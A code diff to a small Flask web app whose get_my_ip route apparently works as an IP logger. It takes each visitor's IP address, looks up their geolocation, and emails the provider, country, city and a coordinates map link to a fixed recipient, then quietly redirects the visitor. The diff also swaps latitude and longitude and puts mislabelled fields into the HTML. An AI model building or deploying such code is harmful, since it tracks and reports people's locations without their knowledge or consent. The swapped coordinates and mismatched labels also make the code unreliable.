@@ -19,18 +19,19 @@ def hello_world():
 def get_my_ip():
     response = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
     data = get_info_by_ip(ip=response)
-
-    req_site = f'https://gps-coordinates.org/my-location.php?lat={data.lat}&lng={data.long}'
+    lon = data['Lat']
+    lat = data['Lon']
+    req_site = f'https://gps-coordinates.org/my-location.php?lat={lat}&lng={lon}'
     msg = MIMEMultipart('alternative')
 
     html = f"""
             <html>
               <head></head>
               <body>
-                <h1> {data["ip"]} </h1>
+                <h1> {data["intProv"]} </h1>
                 <a href={req_site}> Link </a>
                 <h3> Время: {data["Country"]}</h3>
-                <h3> Телефон: {data["city"]} </h3>
+                <h3> Телефон: {data["City"]} </h3>
               </body>
             </html>
             """
@@ -49,10 +50,10 @@ def get_my_ip():
         server.sendmail(msg['From'], msg['To'], msg.as_string())
         print("Email has been sent")
         server.quit()
-        return redirect(url_for("https://www.google.com/"))
+        return redirect('/')
 
     except Exception:
-        return redirect(url_for("/"))
+        return redirect('/')
 
 
 @app.route('/test')
